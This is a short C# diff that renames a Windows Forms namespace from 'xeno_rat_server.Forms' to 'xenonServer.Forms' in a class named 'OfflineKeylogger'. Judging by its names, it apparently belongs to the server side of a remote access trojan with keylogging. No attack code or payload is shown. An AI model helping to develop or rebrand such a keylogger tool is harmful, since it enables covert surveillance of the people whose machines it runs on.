@@ -8,7 +8,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace xeno_rat_server.Forms
+namespace xenonServer.Forms
 {
     public partial class OfflineKeylogger : Form
     {
